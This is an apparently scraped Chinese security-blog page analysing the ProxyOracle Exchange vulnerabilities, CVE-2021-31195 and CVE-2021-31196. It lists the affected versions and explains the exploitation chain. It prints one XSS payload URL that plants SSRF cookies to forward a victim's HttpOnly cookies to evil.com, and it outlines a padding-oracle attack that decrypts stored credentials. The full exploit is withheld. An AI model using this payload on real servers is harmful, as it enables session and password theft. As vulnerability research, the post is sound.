@@ -1,0 +1,213 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+  <head><meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+<meta name="description" content="ProxyOracle漏洞分析"/><meta name="keywords" content="research,analyze" /><link rel="alternate" href="/atom.xml" title="Blog" type="application/atom+xml"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=2.11.0" />
+<link rel="canonical" href="https://hosch3n.github.io/2021/08/23/ProxyOracle漏洞分析/"/>
+
+<link rel="stylesheet" type="text/css" href="/lib/fancybox/jquery.fancybox.css" />
+<link rel="stylesheet" type="text/css" href="/css/style.css?v=2.11.0" />
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-180953397-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-180953397-1');
+</script><script id="baidu_push">
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+<script>
+  window.config = {"leancloud":{"app_id":null,"app_key":null},"toc":true,"fancybox":true,"pjax":"","latex":false};
+</script>
+
+    <title>ProxyOracle漏洞分析 - Blog</title>
+  <meta name="generator" content="Hexo 5.4.0"></head>
+
+  <body><div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/." class="logo">Blog</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list"><a href="/">
+        <li class="mobile-menu-item">首页
+          </li>
+      </a><a href="/tags/">
+        <li class="mobile-menu-item">标签
+          </li>
+      </a><a href="/categories/">
+        <li class="mobile-menu-item">分类
+          </li>
+      </a><a href="/about/">
+        <li class="mobile-menu-item">关于
+          </li>
+      </a></ul>
+</nav>
+<div class="container" id="mobile-panel">
+      <header id="header" class="header"><div class="logo-wrapper">
+  <a href="/." class="logo">Blog</a>
+</div>
+
+<nav class="site-navbar"><ul id="menu" class="menu"><li class="menu-item">
+          <a class="menu-item-link" href="/">
+            首页
+            </a>
+        </li>
+      <li class="menu-item">
+          <a class="menu-item-link" href="/tags/">
+            标签
+            </a>
+        </li>
+      <li class="menu-item">
+          <a class="menu-item-link" href="/categories/">
+            分类
+            </a>
+        </li>
+      <li class="menu-item">
+          <a class="menu-item-link" href="/about/">
+            关于
+            </a>
+        </li>
+      </ul></nav>
+</header>
+
+      <main id="main" class="main">
+        <div class="content-wrapper">
+          <div id="content" class="content"><article class="post">
+    <header class="post-header">
+      <h1 class="post-title">ProxyOracle漏洞分析
+        </h1>
+
+      <div class="post-meta">
+        <span class="post-time">
+          2021-08-23
+        </span><span class="post-category">
+            <a href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a>
+            <a href="/categories/Web%E5%AE%89%E5%85%A8/%E5%AF%86%E7%A0%81%E5%AD%A6/">密码学</a>
+            </span>
+        </div>
+    </header>
+
+    <div class="post-toc" id="post-toc">
+    <h2 class="post-toc-title">文章目录</h2>
+    <div class="post-toc-content">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="toc-text">影响版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2021-31195"><span class="toc-text">CVE-2021-31195</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2021-31196"><span class="toc-text">CVE-2021-31196</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90"><span class="toc-text">利用分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-text">参考链接</span></a></li></ol>
+    </div>
+  </div><div class="post-content"><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><h2 id="CVE-2021-31195"><a href="#CVE-2021-31195" class="headerlink" title="CVE-2021-31195"></a>CVE-2021-31195</h2><ul>
+<li>Exchange Server 2013 &lt; May21SU</li>
+<li>Exchange Server 2016 &lt; May21SU &lt; CU21</li>
+<li>Exchange Server 2019 &lt; May21SU &lt; CU10</li>
+</ul>
+<h2 id="CVE-2021-31196"><a href="#CVE-2021-31196" class="headerlink" title="CVE-2021-31196"></a>CVE-2021-31196</h2><ul>
+<li>Exchange Server 2013 &lt; Jul21SU</li>
+<li>Exchange Server 2016 &lt; Jul21SU</li>
+<li>Exchange Server 2019 &lt; Jul21SU</li>
+</ul>
+<h2 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h2><p>补丁层面的代码分析就不细说了，可以参考上一篇的ProxyLogon漏洞分析。</p>
+<p>CVE-2021-31195是一个1-Click的XSS，但是exchange的cookie各个字段基本都有HttpOnly，没法直接JS获取。还记得上一篇中说到的吗：</p>
+<blockquote>
+<p>小结一下，Cookie的<code>X-BEResource</code>值可以控制CAS请求的Host，结合UriBuilder类特性可以构造出可控的完整URL，因为采用Kerberos认证所以不能向任意站点发起请求</p>
+</blockquote>
+<p>除了<code>X-BEResource</code>字段，还有<code>X-AnonResource-Backend; X-AnonResource</code>这一组字段可以造成SSRF，而且这个不存在kerb认证，可以向任意站点发起HTTPS请求：</p>
+<p><img src="/img/proxyoracle_a.png"></p>
+<p>本质上是让CAS成为一个反代，将我们指定的站点视为后端，转发HTTPS请求。利用这一点，用XSS执行JS给受害者加上一组存在SSRF的Cookie，并向SSRF漏洞入口发起请求，CAS会将带有完整Cookie的HTTPS请求转发到指定站点，实现绕过HttpOnly窃取Cookies。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//ews.lab/owa/auth/frowny.aspx?app=people&amp;et=ServerError&amp;esrc=MasterPage&amp;te=\&amp;refurl=&#125;&#125;&#125;;document.cookie=`X-AnonResource-Backend=@evil.com:443/path/any.php%23~1941962753`;document.cookie=`X-AnonResource=true`;fetch(`/owa/auth/any.skin`,&#123;credentials:`include`&#125;);//</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/proxyoracle_b.png"></p>
+<p>获取到的Cookie中cadataKey、cadataIV、cadataSig是被RSA加密过的字段，cadata字段是用AES-CBC加密的<code>&quot;Basic &quot; + ToBase64String(UserName + &quot;:&quot; + Password)</code>。在AES出现填充错误时，重定向的URL包含<code>reason=0</code>参数；如果是填充正确但业务逻辑出错，重定向的URL包含<code>reason=2</code>参数。</p>
+<p>这样就达成了PaddingOracle攻击的前置条件，不熟悉的同学请参考附加篇PaddingOracle攻击原理。</p>
+<p>但是因为IV被RSA加密，属于上文中既不可读也不可见的情况，我们无法通过PaddingOracle解密出cadata密文的第一块（16个字符），但好在拼接了<code>Basic </code>字符串且C#的编码为UTF-16-LE（每个ASCII字符对应两个编码），所以前6*2=12个字节会是固定的。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&quot;Basic &quot;</span>.encode(<span class="string">&quot;utf-16-le&quot;</span>)</span><br><span class="line"><span class="string">b&#x27;B\x00a\x00s\x00i\x00c\x00 \x00&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>那么第一块中还有16-12=4个字节无法确认，不过AES-CBC加密的其实是Base64编码（每4个编码对应3个ASCII字符），我们最终只会损失(4/2)*(3/4)=1.5个明文ASCII字符（要向上取整，损失两个）。而这前两个ASCII字符，在窃取到的Cookie中<code>logondata=acc=0&amp;lgn=test.com\administrator;</code>已经可以读到了。</p>
+<p>接下来就是跑PaddingOracle了，不想太有判头不放完整EXP了，理解原理后可以很快写出来。</p>
+<p><img src="/img/proxyoracle_c.png"></p>
+<p><em>下一篇我们将一起讨论ProxyShell～</em></p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a target="_blank" rel="noopener" href="https://blog.orange.tw/2021/08/proxyoracle-a-new-attack-surface-on-ms-exchange-part-2.html">A New Attack Surface on MS Exchange Part 2 - ProxyOracle!</a></p>
+
+      </div>
+      
+      <footer class="post-footer">
+        <div class="post-tags">
+            <a href="/tags/Exchange/">Exchange</a>
+            <a href="/tags/XSS/">XSS</a>
+            <a href="/tags/PaddingOracle/">PaddingOracle</a>
+            <a href="/tags/CVE-2021-31195/">CVE-2021-31195</a>
+            <a href="/tags/CVE-2021-31196/">CVE-2021-31196</a>
+            </div>
+        
+        <nav class="post-nav"><a class="prev" href="/2021/08/24/ProxyShell%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
+        <i class="iconfont icon-left"></i>
+        <span class="prev-text nav-default">ProxyShell漏洞分析</span>
+        <span class="prev-text nav-mobile">上一篇</span>
+      </a>
+    <a class="next" href="/2021/08/22/ProxyLogon%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
+        <span class="next-text nav-default">ProxyLogon漏洞分析</span>
+        <span class="prev-text nav-mobile">下一篇</span>
+        <i class="iconfont icon-right"></i>
+      </a>
+    </nav></footer>
+    </article></div><div class="comments" id="comments"></div></div>
+      </main>
+
+      <footer id="footer" class="footer"><div class="social-links"><a href="mailto:hosch3n@protonmail.com" class="iconfont icon-email" title="email"></a>
+        <a target="_blank" rel="noopener" href="https://github.com/hosch3n" class="iconfont icon-github" title="github"></a>
+        <a href="/atom.xml" class="iconfont icon-rss" title="rss"></a>
+    </div><div class="copyright">
+  <span class="power-by">
+    由 <a class="hexo-link" target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a> 强力驱动
+  </span>
+  <span class="division">|</span>
+  <span class="theme-info">
+    主题 - 
+    <a class="theme-link" target="_blank" rel="noopener" href="https://github.com/ahonn/hexo-theme-even">Even</a>
+  </span>
+
+  <span class="copyright-year">&copy;2021 - 2022<span class="heart">
+      <i class="iconfont icon-heart"></i>
+    </span>
+    <span class="author">hosch3n</span>
+  </span>
+</div>
+</footer>
+
+      <div class="back-to-top" id="back-to-top">
+        <i class="iconfont icon-up"></i>
+      </div>
+    </div><script type="text/javascript" src="/lib/jquery/jquery.min.js"></script>
+  <script type="text/javascript" src="/lib/slideout/slideout.js"></script>
+  <script type="text/javascript" src="/lib/fancybox/jquery.fancybox.pack.js"></script>
+  <script type="text/javascript" src="/js/src/even.js?v=2.11.0"></script>
+</body>
+</html>
